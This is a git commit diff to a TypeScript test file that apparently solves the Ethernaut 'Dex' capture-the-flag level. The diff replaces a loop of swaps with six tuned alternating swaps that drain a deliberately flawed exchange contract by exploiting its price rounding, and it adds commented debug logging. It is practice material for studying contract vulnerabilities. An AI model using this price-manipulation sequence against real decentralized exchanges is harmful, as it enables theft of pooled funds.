594d0b69af1534eae60a2647a21e7c99abcb75e4
VitalR <vitalii.rodikov@gmail.com>
2023-02-25 17:35:48 +0200

    Add Dex

--- test/22-dex-test.ts
+++ test/22-dex-test.ts
@@ -35,21 +35,32 @@ describe(CONTRACT_NAME, () => {
         await token1["approve(address,address,uint256)"](owner.address, dex.address, 100)
         await token2["approve(address,address,uint256)"](owner.address, dex.address, 100)
 
-        await token1["approve(address,address,uint256)"](attacker.address, dex.address, 10000)
-        await token2["approve(address,address,uint256)"](attacker.address, dex.address, 10000)
+        await token1["approve(address,address,uint256)"](attacker.address, dex.address, 200)
+        await token2["approve(address,address,uint256)"](attacker.address, dex.address, 200)
 
         await dex.setTokens(token1.address, token2.address)
 
         await dex.addLiquidity(token1.address, 100)
         await dex.addLiquidity(token2.address, 100)
 
-        for (let i = 0; i < 50; i++) {
-            await dex.connect(attacker).swap(token1.address, token2.address, 10)
-            await dex.connect(attacker).swap(token2.address, token1.address, 10)
-        }
-
-        await dex.connect(attacker).swap(token1.address, token2.address, 40)
-        // console.log(await token1.balanceOf(dex.address), await token2.balanceOf(dex.address))
+        await dex.connect(attacker).swap(token1.address, token2.address, 10)
+        // console.log(`New token balances are: ${ await token1.balanceOf(dex.address) } for token1 and ${ await token2.balanceOf(dex.address) } for token2 after 1st swap`)
+        // console.log(`Balances of player are ${ await token1.balanceOf(attacker.address) }, ${ await token2.balanceOf(attacker.address) }`)
+        await dex.connect(attacker).swap(token2.address, token1.address, 20)
+        // console.log(`New token balances are: ${ await token1.balanceOf(dex.address) } for token1 and ${ await token2.balanceOf(dex.address) } for token2 after 2nd swap`)
+        // console.log(`Balances of player are ${ await token1.balanceOf(attacker.address) }, ${ await token2.balanceOf(attacker.address) }`)
+        await dex.connect(attacker).swap(token1.address, token2.address, 24)
+        // console.log(`New token balances are: ${ await token1.balanceOf(dex.address) } for token1 and ${ await token2.balanceOf(dex.address) } for token2 after 3rd swap`)
+        // console.log(`Balances of player are ${ await token1.balanceOf(attacker.address) }, ${ await token2.balanceOf(attacker.address) }`)
+        await dex.connect(attacker).swap(token2.address, token1.address, 30)
+        // console.log(`New token balances are: ${ await token1.balanceOf(dex.address) } for token1 and ${ await token2.balanceOf(dex.address) } for token2 after 4th swap`)
+        // console.log(`Balances of player are ${ await token1.balanceOf(attacker.address) }, ${ await token2.balanceOf(attacker.address) }`)
+        await dex.connect(attacker).swap(token1.address, token2.address, 41)
+        // console.log(`New token balances are: ${ await token1.balanceOf(dex.address) } for token1 and ${ await token2.balanceOf(dex.address) } for token2 after 5th swap`)
+        // console.log(`Balances of player are ${ await token1.balanceOf(attacker.address) }, ${ await token2.balanceOf(attacker.address) }`)
+        await dex.connect(attacker).swap(token2.address, token1.address, 45)
+        // console.log(`New token balances are: ${ await token1.balanceOf(dex.address) } for token1 and ${ await token2.balanceOf(dex.address) } for token2 after 6th swap`)
+        // console.log(`Balances of player are ${ await token1.balanceOf(attacker.address) }, ${ await token2.balanceOf(attacker.address) }`)
 
         const token1DexBalanceAfter = await token1.balanceOf(dex.address)
         const token2DexBalanceAfter = await token2.balanceOf(dex.address)
